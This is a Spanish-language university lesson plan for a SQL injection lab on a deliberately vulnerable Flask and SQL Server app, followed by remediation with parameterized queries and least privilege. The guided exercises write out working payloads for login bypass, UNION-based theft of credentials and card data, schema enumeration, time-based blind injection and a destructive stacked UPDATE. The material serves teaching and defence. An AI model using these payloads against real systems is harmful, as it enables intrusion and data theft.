# Clase: Inyección SQL contra la base de datos

**Programa:** Ingeniería en Seguridad Informática y Redes (ISIR) — UAdeO
**Modalidad sugerida:** 1 sesión de teoría + práctica (90 min) + 1 sesión de remediación (90 min)
**Formato:** laboratorio práctico en entorno local aislado (Docker)
**Entorno:** carpeta `ClaseSeguridadUadeo/` (SQL Server 2025 + app Flask vulnerable)

---

## 1. Objetivos de aprendizaje

Al terminar, el alumno será capaz de:

1. Explicar por qué ocurre la inyección SQL (mezcla de código y datos).
2. Identificar un punto de inyección y clasificar el tipo (in-band, ciega, apilada).
3. Explotar manualmente: bypass de autenticación, extracción de datos vía `UNION`, enumeración del esquema y una consulta ciega basada en tiempo.
4. Medir el impacto real (robo de credenciales y de datos sensibles).
5. Remediar la aplicación con consultas parametrizadas y mínimo privilegio, y verificar que el ataque deja de funcionar.
6. Proponer detección (auditoría) y defensa en profundidad.

---

## 2. Advertencia ética y legal (leer en voz alta en clase)

> Las técnicas de esta práctica solo se ejecutan en **este laboratorio**, que es tuyo y está aislado. Atacar sistemas de terceros sin autorización por escrito es un delito (en México, delitos informáticos tipificados en el Código Penal Federal, arts. 211 bis). El objetivo del ejercicio es **aprender a defender**: no hay forma de proteger lo que no entiendes cómo se rompe.

Haz que cada alumno confirme que entiende el alcance antes de empezar. Es parte de la formación profesional en seguridad.

---

## 3. Marco teórico (20 min)

### ¿Qué es la inyección SQL?

Ocurre cuando una aplicación construye una consulta **concatenando** entrada del usuario con el texto del SQL. La entrada deja de ser un dato y pasa a ser parte del **código** de la consulta. La causa raíz es siempre la misma: no se separan código y datos.

Ejemplo del laboratorio (login):

```python
query = f"SELECT Id, Usuario, Rol FROM Usuarios WHERE Usuario = '{usuario}' AND PasswordHash = '{password}'"
```

Si el usuario escribe `admin' --`, el SQL que llega al motor es:

```sql
SELECT Id, Usuario, Rol FROM Usuarios WHERE Usuario = 'admin' --' AND PasswordHash = '...'
```

El `--` comenta el resto: la contraseña ya no se valida.

### Tipos principales

| Tipo | Idea | Ejemplo en el lab |
|------|------|-------------------|
| **In-band / UNION** | El resultado del ataque sale en la misma respuesta | `UNION SELECT Usuario, PasswordHash, Id FROM Usuarios` |
| **Basada en error** | El motor devuelve mensajes que filtran información | conversión forzada de `@@version` |
| **Ciega booleana** | No hay salida; se infiere por verdadero/falso | `' AND 1=1 --` vs `' AND 1=2 --` |
| **Ciega por tiempo** | Se infiere por el retardo de la respuesta | `WAITFOR DELAY '0:0:5'` (específico de SQL Server) |
| **Apilada (stacked)** | Se ejecutan sentencias adicionales | `'; UPDATE Productos SET Precio=0; --` |

> Dato clave para ISIR: SQL Server **sí permite consultas apiladas** (varias sentencias separadas por `;` en un mismo lote). Esto lo hace más peligroso que, por ejemplo, MySQL con el API clásico de PHP, que solo ejecuta una sentencia por llamada.

### Por qué importa el privilegio del login

El daño que puede hacer una inyección está acotado por los permisos del usuario con el que la app se conecta. Si la app entra como `db_owner` o `sysadmin`, una inyección puede borrar tablas, leer todo o incluso tocar el sistema operativo (`xp_cmdshell`). En el lab, la app entra a propósito como `db_owner`: ese es uno de los defectos a corregir.

---

## 4. Guion de la sesión 1 — ataque (90 min)

| Tiempo | Actividad |
|--------|-----------|
| 0–20 | Teoría (sección 3) |
| 20–30 | Montaje del laboratorio (todos levantan Docker) |
| 30–45 | Práctica A: bypass de autenticación |
| 45–70 | Práctica B: extracción de datos con `UNION` y enumeración del esquema |
| 70–85 | Práctica C: consulta ciega por tiempo y consulta apilada (demostración) |
| 85–90 | Cierre: cada equipo anota el dato más sensible que logró extraer |

### Montaje (resumen; ver `README.md`)

```bash
cd ClaseSeguridadUadeo
docker compose up -d --build
```

No hace falta esperar a mano: el servicio `db` publica un `healthcheck` y `init`
siembra la base recién cuando SQL Server acepta conexiones. La web arranca
después de que `init` termina bien, así que si algo falla el propio Compose lo
detiene en vez de dejarte una web que no conecta.

App vulnerable en `http://localhost:8000`. El puerto **no es el 5000** porque en
macOS lo ocupa el AirPlay Receiver y responde `403` antes de que Docker pueda
atender el pedido (detalle en `README.md`). La página muestra el **SQL
ejecutado** en cada operación: es la mejor ayuda didáctica, porque el alumno ve
cómo su entrada se convierte en código.

---

## 5. Práctica guiada

> En cada paso el alumno debe **capturar pantalla**, pegar el SQL que se ejecutó y explicar con sus palabras por qué funcionó. Eso es lo que se entrega.

### Práctica A — Bypass de autenticación

1. Intenta entrar con usuario `admin` y una contraseña cualquiera → acceso denegado.
2. Ahora en **Usuario** escribe:
   ```
   admin' --
   ```
   y cualquier cosa en contraseña. ¿Qué pasó? Observa el SQL ejecutado.
3. Prueba también:
   ```
   ' OR 1=1 --
   ```
   ¿Qué usuario quedó autenticado y por qué ese?

**Pregunta de análisis:** ¿por qué `--` fue suficiente para anular la verificación de la contraseña?

### Práctica B — Extracción de datos (UNION)

Todo esto va en el campo **Buscar producto** (`/buscar?q=`).

1. **Contar columnas.** Prueba `ORDER BY` incrementando el número hasta que falle:
   ```
   ' ORDER BY 3 --
   ' ORDER BY 4 --
   ```
   ¿Cuántas columnas tiene la consulta original?

2. **Confirmar el `UNION`** con el número correcto de columnas:
   ```
   ' UNION SELECT NULL, NULL, NULL --
   ```

3. **Leer metadatos del servidor:**
   ```
   ' UNION SELECT @@version, DB_NAME(), NULL --
   ```

4. **Enumerar tablas y columnas** (catálogo estándar de información):
   ```
   ' UNION SELECT TABLE_NAME, TABLE_SCHEMA, NULL FROM INFORMATION_SCHEMA.TABLES --
   ' UNION SELECT COLUMN_NAME, TABLE_NAME, NULL FROM INFORMATION_SCHEMA.COLUMNS --
   ```

5. **Robar credenciales:**
   ```
   ' UNION SELECT Usuario, PasswordHash, Id FROM Usuarios --
   ```

6. **Robar datos sensibles de clientes:**
   ```
   ' UNION SELECT Nombre, Tarjeta, NULL FROM Clientes --
   ```

**Pregunta de análisis:** ¿por qué el atacante necesita que coincidan el número y el tipo de columnas? ¿Qué papel juega `INFORMATION_SCHEMA`?

### Práctica C — Ciega por tiempo y apilada (demostración del profesor + prueba)

1. **Ciega por tiempo** (en Buscar). Si no hubiera salida visible, el atacante aún puede confirmar la inyección midiendo el retardo:
   ```
   '; WAITFOR DELAY '0:0:5' --
   ```
   La respuesta tarda 5 segundos. Explica por qué esto sirve aunque no se vea ningún dato.

2. **Consulta apilada** (demostrar con cuidado; es destructivo en el lab):
   ```
   '; UPDATE Productos SET Precio = 0; --
   ```
   Vuelve a buscar y observa los precios en cero. Comenta qué habría pasado con
   `DROP TABLE` y cómo el privilegio excesivo del login lo hizo posible.

> **Punto fino para comentar en clase.** Esta demostración solo deja efecto
> porque las apps abren la conexión con `autocommit=True`. Sin eso, `pymssql`
> abre una transacción implícita y el cierre de la conexión la revierte: la
> sentencia apilada **llega al motor y se ejecuta**, pero no persiste nada.
> Las dos pruebas conviene contrastarlas, porque enseñan que *ver la sentencia
> llegar* no es lo mismo que *ver el efecto*.
>
> El `autocommit` **no es un control de seguridad**: es solo el modo
> transaccional de la aplicación, y que un rollback te salve es accidental.
>
> Tras la demostración destructiva, restaura los datos sin bajar el laboratorio:
> `docker compose run --rm init`.

---

## 6. Guion de la sesión 2 — defensa y remediación (90 min)

| Tiempo | Actividad |
|--------|-----------|
| 0–15 | Repaso: causa raíz = mezcla de código y datos |
| 15–45 | Corrección 1: consultas parametrizadas (`app_seguro.py`) |
| 45–65 | Corrección 2: mínimo privilegio en el login de la app |
| 65–80 | Defensa en profundidad: validación, procedimientos, errores, detección |
| 80–90 | Re-prueba: repetir los ataques de la sesión 1 y confirmar que fallan |

### Corrección 1 — Consultas parametrizadas (la corrección de fondo)

La entrada viaja como **parámetro**, nunca como texto del SQL. Comparar `app.py` (vulnerable) con `app_seguro.py`:

```python
# VULNERABLE
query = f"... WHERE Usuario = '{usuario}' AND PasswordHash = '{password}'"
cur.execute(query)

# SEGURO (pymssql usa %s; con pyodbc seria ?)
query = "... WHERE Usuario = %s AND PasswordHash = %s"
cur.execute(query, (usuario, password))
```

Activar la versión segura y volver a intentar los ataques. Las dos versiones ya
están dentro de la imagen, así que no hace falta renombrar nada ni reconstruir:

```bash
APP_FILE=app_seguro.py docker compose up -d web   # versión corregida
docker compose up -d web                          # volver a la vulnerable
```

Los mismos payloads de la sesión 1 ahora se tratan como texto literal de búsqueda: no alteran la consulta.

### Corrección 2 — Mínimo privilegio

La app no debería entrar como `db_owner`. Aplicar (como `sa`):

```sql
USE TiendaLab;
ALTER ROLE db_owner DROP MEMBER app_user;

-- Solo lo que la app realmente necesita:
GRANT SELECT ON dbo.Productos TO app_user;
GRANT SELECT ON dbo.Usuarios  TO app_user;   -- o mejor: solo EXECUTE de un SP de login

-- Datos sensibles fuera del alcance de la app:
DENY SELECT ON dbo.Clientes TO app_user;
```

**Discusión:** aunque la inyección persistiera, ¿qué ya no podría hacer el atacante con estos permisos? (No podría leer `Clientes`, ni modificar, ni borrar.)

### Defensa en profundidad (complementos, no sustitutos)

- **Procedimientos almacenados con parámetros.** Encapsulan la consulta; pero ojo: un SP que arma SQL dinámico concatenando sigue siendo vulnerable. Lo que protege son los parámetros, no el SP por sí mismo.
- **Validación / lista blanca** para entradas que no pueden parametrizarse, como un nombre de columna en `ORDER BY` (se valida contra una lista permitida).
- **Mensajes de error genéricos** en producción: no exponer el SQL ni los errores del motor (en el lab se muestran a propósito para enseñar).
- **Detección:** SQL Server Audit o Extended Events para registrar logins fallidos y patrones sospechosos; un WAF para bloquear payloads comunes en la capa web.
- **Hashing real de contraseñas** (bcrypt/Argon2) para que, aun si se filtran, no sean reutilizables. En el lab los "hashes" son ficticios.

---

## 7. Reto de cierre (opcional, por equipos)

Cada equipo asegura su copia del laboratorio (parametrización + mínimo privilegio) y luego intenta vulnerar la de otro equipo durante 15 minutos. Entregan un **reporte de hallazgos** con: punto de inyección probado, payloads, resultado y recomendación. Gana el equipo cuya app resistió y cuyo reporte de ataque fue más claro.

---

## 8. Rúbrica de evaluación (100 pts)

| Criterio | Pts |
|----------|-----|
| Montaje correcto del laboratorio | 10 |
| Práctica A — bypass de autenticación documentado y explicado | 15 |
| Práctica B — extracción con `UNION` y enumeración del esquema | 20 |
| Práctica C — ciega por tiempo y explicación de la apilada | 10 |
| Corrección 1 — parametrización funcionando y verificada | 20 |
| Corrección 2 — mínimo privilegio aplicado y justificado | 15 |
| Calidad del análisis (explica el *porqué*, no solo el *qué*) | 10 |

**Penalización:** ejecutar cualquier técnica fuera del laboratorio = reprobación automática de la práctica (refuerza la cláusula ética).

---

## 9. Tarea / investigación

1. Investiga el **Top 10 de OWASP** y ubica dónde entra la inyección. Resume en media cuartilla.
2. Explica la diferencia entre **inyección ciega booleana** y **por tiempo**, con un ejemplo propio para SQL Server.
3. Caso real: elige una brecha pública causada por SQLi, describe qué falló y qué control la habría evitado (1 cuartilla).
4. **Extra:** reescribe el login del laboratorio usando un **procedimiento almacenado parametrizado** y demuestra que sigue siendo seguro.

---

## 10. Referencias

- OWASP — SQL Injection Prevention Cheat Sheet
- OWASP — Testing for SQL Injection
- Microsoft Learn — Consultas parametrizadas y procedimientos almacenados en SQL Server
- Microsoft Learn — SQL Server Audit y Extended Events
